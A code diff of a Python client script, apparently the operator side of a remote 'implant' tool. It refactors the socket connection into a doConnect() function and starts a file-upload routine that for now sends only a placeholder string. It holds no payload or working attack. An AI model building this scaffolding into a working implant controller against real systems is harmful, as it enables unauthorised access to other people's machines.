@@ -25,10 +25,23 @@ def printHelp():
 #-----------------------------------------------
 
 #-----------------------------------------------
-def putFile(filepath, filename, overwrite):
+def doConnect():
     try:
-        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
-            sock.connect((HOST, PORT_NUM))
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.connect((HOST, PORT_NUM))
+
+    except Exception as e:
+        print("ERROR: Could not connect to implant: ", e)
+        return 0
+
+    return sock
+#-----------------------------------------------
+
+#-----------------------------------------------
+def putFile(sock, filepath, filename, overwrite):
+    try:
+        sock.send(bytes("test", "utf-8"))
+        resp = sock.recv(8)
 
     except Exception as e:
         print("ERROR: Could not connect to implant: ", e)
@@ -39,11 +52,14 @@ def putFile(filepath, filename, overwrite):
 
 #-----------------------------------------------
 def handleInput():
+    sock = doConnect()
     userInput = 1
     while (int(userInput) != EXIT):
         printHelp()
         userInput = input("> ")
+        # add ip and port num to pass
 
+        # change this to parser object with ip and port specified
         if (int(userInput) == PUT):
             filepath= input("Please input filepath > ")
             filename = input("Please input filename (if not provided will use source file name) > ")
@@ -52,7 +68,7 @@ def handleInput():
             filename = bytes(filename, 'utf-8')
             overwrite = bytes(overwrite, 'utf-8')
 
-            putFile(filepath, filename, overwrite)
+            putFile(sock, filepath, filename, overwrite)
 
     return
 
